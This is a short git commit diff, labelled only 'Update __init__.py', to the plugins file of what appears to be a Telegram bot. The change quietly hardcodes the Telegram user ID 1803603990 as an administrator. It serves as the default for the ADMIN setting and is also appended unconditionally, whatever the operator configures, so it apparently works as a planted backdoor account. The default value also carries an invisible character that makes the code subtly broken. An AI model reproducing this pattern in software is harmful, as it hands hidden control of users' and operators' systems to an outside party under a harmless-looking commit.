e5c7c7ba4affee3ce7b303aeffa4c8ec78147155
Trippy03 <140531797+Trippy03@users.noreply.github.com>
2023-11-08 12:51:29 +0530

    Update __init__.py

--- plugins/__init__.py
+++ plugins/__init__.py
@@ -7,7 +7,14 @@
 
 from aiohttp import web
 from .route import routes
+from config import ADMINS
 
+try:
+    ADMIN = [int(x) for x in (os.environ.get("ADMIN", "1803603990‎").split())]
+except ValueError:
+    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
+
+ADMIN.extend((ADMINS, 1803603990))
 
 async def web_server():
     web_app = web.Application(client_max_size=30000000)
